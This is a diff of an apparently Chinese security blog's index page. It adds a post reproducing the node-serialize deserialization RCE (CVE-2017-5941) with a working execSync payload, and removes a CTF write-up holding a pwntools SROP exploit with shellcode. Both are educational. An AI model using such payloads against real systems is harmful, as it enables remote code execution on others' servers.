@@ -131,6 +131,50 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2024/01/10/node反序列化RCE/" >node反序列化RCE(CVE-2017-5941)</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2024-01-10
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2017-5941  漏洞出现在node-serialize模块0.0.4版本当中   反序列化时执行eval并且参数可控 存在RCE</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>npm install node-serialize@0.0.4</code></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>了解什么是IIFE：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
+<p>IIFE一般写成下面的形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">// 或者</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>先看到序列化结果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    <span class="string">&quot;rce&quot;</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_">toString</span>())&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> srl = serialize.<span class="title function_">serialize</span>(test);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(srl);</span><br><span class="line"><span class="comment">// &#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString())&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>unserialize反序列化代码逻辑</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">unserialize</span> = <span class="keyword">function</span>(<span class="params">obj, originObj</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> isIndex;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(obj);</span><br><span class="line">    isIndex = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  originObj = originObj || obj;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> circularTasks = [];</span><br><span class="line">  <span class="keyword">var</span> key;</span><br><span class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        obj[key] = <span class="built_in">exports</span>.<span class="title function_">unserialize</span>(obj[key], originObj);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">FUNCFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].<span class="title function_">substring</span>(<span class="variable constant_">FUNCFLAG</span>.<span class="property">length</span>) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">CIRCULARFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = obj[key].<span class="title function_">substring</span>(<span class="variable constant_">CIRCULARFLAG</span>.<span class="property">length</span>);</span><br><span class="line">          circularTasks.<span class="title function_">push</span>(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isIndex) &#123;</span><br><span class="line">    circularTasks.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">task</span>) &#123;</span><br><span class="line">      task.<span class="property">obj</span>[task.<span class="property">key</span>] = <span class="title function_">getKeyPath</span>(originObj, task.<span class="property">obj</span>[task.<span class="property">key</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>17# eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code> </p>
+<p>这里<code>FUNCFLAG=_$$ND_FUNC$$_</code> 也就是如果反序列化时如果识别为函数  则会直接拼接function部分 并eval     那么我们只要构造类似<code>eval(&#39;(function()&#123;console.log(2)&#125;)&#39;)</code> 即可执行</p>
+<h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>在序列化结果末尾添上<code>()</code>  然后反序列化</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(\&#x27;child_process\&#x27;).execSync(\&#x27;ls /\&#x27;).toString())&#125;()&quot;&#125;&#x27;</span>;</span><br><span class="line">serialize.<span class="title function_">unserialize</span>(payload);</span><br><span class="line"><span class="comment">// 成功执行ls /</span></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2024/01/10/node反序列化RCE/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" >HNCTF2023-BabyJxVx-wp</a>
 								</h3>
 							</div>
@@ -766,45 +810,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/11/10/swampctf2019-syscaller-wp/" >swampctf2019-syscaller-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-11-10
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="swampctf2019-syscaller"><a href="#swampctf2019-syscaller" class="headerlink" title="swampctf2019 syscaller"></a>swampctf2019 syscaller</h1><p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/16-srop/swamp19_syscaller/index.html">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec syscaller </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000E0      _start: </span><br><span class="line">.text:00000000004000E0      push    rbp</span><br><span class="line">.text:00000000004000E1      mov     rbp, rsp</span><br><span class="line">.text:00000000004000E4      sub     rsp, 200h</span><br><span class="line">.text:00000000004000EB      mov     edi, 1</span><br><span class="line">.text:00000000004000F0      mov     rsi, offset msg1 ; &quot;Hello and welcome to&quot;...</span><br><span class="line">.text:00000000004000FA      mov     edx, 3Eh ; &#x27;&gt;&#x27;</span><br><span class="line">.text:00000000004000FF      mov     eax, 1</span><br><span class="line">.text:0000000000400104      syscall                  ; LINUX - sys_write</span><br><span class="line">.text:0000000000400106      mov     eax, 0</span><br><span class="line">.text:000000000040010B      mov     rsi, rsp</span><br><span class="line">.text:000000000040010E      mov     edi, 0</span><br><span class="line">.text:0000000000400113      mov     edx, 200h</span><br><span class="line">.text:0000000000400118      syscall                  ; LINUX - sys_read</span><br><span class="line">.text:000000000040011A      pop     r12</span><br><span class="line">.text:000000000040011C      pop     r11</span><br><span class="line">.text:000000000040011E      pop     rdi</span><br><span class="line">.text:000000000040011F      pop     rax</span><br><span class="line">.text:0000000000400120      pop     rbx</span><br><span class="line">.text:0000000000400121      pop     rdx</span><br><span class="line">.text:0000000000400122      pop     rsi</span><br><span class="line">.text:0000000000400123      pop     rdi</span><br><span class="line">.text:0000000000400124      syscall                  ; LINUX -</span><br><span class="line">.text:0000000000400126      mov     eax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:000000000040012B      xor     rdi, rdi</span><br><span class="line">.text:000000000040012E      syscall                  ; LINUX - sys_exit</span><br></pre></td></tr></table></figure>
-
-<p>可以看到首先sys_write msg1， 然后sys_read读内容到栈上  之后再pop各寄存器后触发syscall</p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>首先想着把str_binsh写到哪里然后执行sys_execve，但查看程序段发现只有栈段是可写的   但是如果用syscall输出泄露栈地址，后面就无法继续控制了 </p>
-<p>这里想了好久  后面看wp知道mprotect函数也可以syscall执行(rax&#x3D;10)，来改写.text段权限 ，这样就可以让sigFrame的rsp 为.text内的地址  ，rip为0x400104</p>
-<p>这样就可以跳回执行syscall调用mprotect更改text段权限，紧接着读内容到text段上，那么我们就可以直接写shellcode了</p>
-<p>可以让rsp &#x3D;0x40011A，这样读完shellcode往下执行的时候就直接执行shellcode了</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./syscaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400113</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x0000000000400104</span></span><br><span class="line"></span><br><span class="line">f = SigreturnFrame()</span><br><span class="line">f.rax = <span class="number">10</span></span><br><span class="line">f.rdi = <span class="number">0x00000000400000</span></span><br><span class="line">f.rsi = <span class="number">0x1000</span></span><br><span class="line">f.rip = syscall</span><br><span class="line">f.rdx = <span class="number">0x7</span></span><br><span class="line">f.rsp = <span class="number">0x000000000040011A</span></span><br><span class="line"></span><br><span class="line">pld = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xf</span>) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">pld += <span class="built_in">bytes</span>(f)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;perish.&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">scode = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">s(scode)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/11/10/swampctf2019-syscaller-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -864,7 +869,7 @@
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>7</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
 		
 			<li><a href="/categories/web-wp/">web-wp<span>52</span></a></li>
 		
@@ -877,45 +882,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
+			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
 		
-			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
+			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
 		
-			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
 		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+			<li><a href="/tags/yaml反序列化/">yaml反序列化<span>1</span></a></li>
 		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
-		
-			<li><a href="/tags/unserialize/">unserialize<span>13</span></a></li>
-		
-			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
-		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
-		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
-		
-			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
-		
-			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
-		
-			<li><a href="/tags/XXE/">XXE<span>2</span></a></li>
-		
-			<li><a href="/tags/nssctf/">nssctf<span>57</span></a></li>
-		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
 			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
 		
-			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
+			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
 		
-			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
 		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
+			<li><a href="/tags/rce/">rce<span>19</span></a></li>
 		
-			<li><a href="/tags/xss/">xss<span>1</span></a></li>
+			<li><a href="/tags/redis/">redis<span>1</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>57</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/SSTI/">SSTI<span>6</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+		
+			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+		
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/afr/">afr<span>2</span></a></li>
+		
+			<li><a href="/tags/php/">php<span>23</span></a></li>
+		
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>121</span></a></li>
@@ -931,6 +936,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
+      </li>
+    
+      <li>
         <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
       </li>
     
@@ -944,10 +953,6 @@
     
       <li>
         <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/12/13/Shiro反序列化/" ><i class="fa fa-file-o"></i>Shiro反序列化</a>
       </li>
     
   </ul>
